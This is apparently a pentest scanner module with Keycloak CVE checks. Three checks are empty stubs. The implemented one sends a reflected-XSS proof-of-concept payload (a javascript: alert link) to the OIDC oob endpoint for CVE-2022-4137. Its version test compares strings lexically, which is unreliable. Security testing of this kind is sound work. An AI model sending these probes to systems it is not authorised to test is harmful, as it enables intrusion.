import requests
import pentest_base as pb

######### REDIRECT_URI CVEs #########

# CVE-2024-1132 Check with Keycloak version and realm name
def cve_2024_1132_check(url,version=None, realm="master", verbose=False):
    # A FAIRE
    pass

# CVE-2022-4361
def cve_2022_4361_check(url,version=None, realm="master", verbose=False):
    # A FAIRE
    pass

# CVE-2022-3782 
def cve_2022_3782_check(url,version=None, realm="master", verbose=False):
    # A FAIRE
    pass

### OTHERS ###

# CVE-2022-4137 Check with Keycloak version and realm name
def cve_2022_4137_check(url,version=None, realm="master", verbose=False):
    # check if the version is vulnerable < 20.0.5
    if version != None:
        if version < "20.0.5":
            return True
    # Si la version est null ou supérieure à 20.0.5
    if version == None:
        # Check /protocol/openid-connect/oauth/oob?error=%3Ca%20href=%22javascript%26%00colon;alert(document.domain)%22%3EReturn%20to%20application%3C/a%3E
        # If the response contains the string <a href="javascript&colon;alert%28document.domain%29" rel="nofollow">Return to application</a>
        # return True
        if verbose:
            pb.info(f"Checking for CVE-2022-4137 on {url} with realm {realm}")
        # Process the request
        r=None
        try:
            r = requests.get(f"{url}/realms/{realm}/protocol/openid-connect/oauth/oob?error=%3Ca%20href=%22javascript%26%00colon;alert(document.domain)%22%3EReturn%20to%20application%3C/a%3E", timeout=5)
        except requests.exceptions.Timeout:
            if verbose:
                pb.error("Request timed out")
            return False
        # Print the resquest
        if verbose and r:
            pb.info(f"Request: {r.url}")
        # Check if the response contains the string
        if r:
            if r.status_code == 200:
                if r.text:
                    if '<a href="javascript&colon;alert%28document.domain%29" rel="nofollow">Return to application</a>' in r.text:
                        return True
                    if '<a href="javascript&colon;alert(document.domain)" rel="nofollow">Return to application</a>' in r.text:
                        return True
    return False